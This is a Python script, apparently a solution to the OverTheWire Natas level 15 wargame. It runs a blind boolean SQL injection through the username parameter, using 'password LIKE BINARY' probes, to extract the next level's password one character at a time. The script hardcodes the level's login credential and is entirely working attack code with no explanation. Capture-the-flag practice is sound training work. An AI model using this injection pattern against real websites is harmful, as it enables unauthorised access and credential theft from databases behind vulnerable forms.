import requests
from requests.auth import HTTPBasicAuth
import string

cor_vermelha = "\x1b[31m"
cor_verde = "\x1b[32m"
cor_amarela = "\x1b[33m"
cor_azul = "\x1b[34m"
reset = "\x1b[0m"

characteres = string.ascii_letters + string.digits
username = "natas15"
natas15_pass = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
natas16_shuffled_pass = ""
natas16_final_pass = ""

target = "http://natas15.natas.labs.overthewire.org/"
serverResponse = "This user exists."

# verify -> ignore SSL certificate verification
r = requests.get(target, verify=False, auth=HTTPBasicAuth(username, natas15_pass))

for c in characteres:
    r = requests.get(
        target + '?username=natas16" AND password LIKE BINARY "%' + c + '%" "',
        auth=HTTPBasicAuth(username, natas15_pass),
    )
    if r.text.find(serverResponse) != -1:
        natas16_shuffled_pass += c
        print(f"{cor_amarela}[+] Letters in pass: {natas16_shuffled_pass}{reset}")

print(f"\n{cor_vermelha}[+] All password characters were found.{reset}")
print(f"{cor_vermelha}[+] Starting brute force process...\n{reset}")

for i in range(32):
    for c in natas16_shuffled_pass:
        r = requests.get(
            target
            + '?username=natas16" AND password LIKE BINARY "'
            + natas16_final_pass
            + c
            + '%" "',
            auth=HTTPBasicAuth(username, natas15_pass),
        )

        if r.text.find(serverResponse) != -1:
            pass_length = len(natas16_final_pass) + 1
            natas16_final_pass += c
            print(
                f'{cor_verde}[+] Password: {natas16_final_pass} {"_" * int(32 - pass_length)} [{pass_length}/32]{reset}'
            )
            break

print(f'\n{cor_azul}[+] Final pass: {natas16_final_pass}{reset}')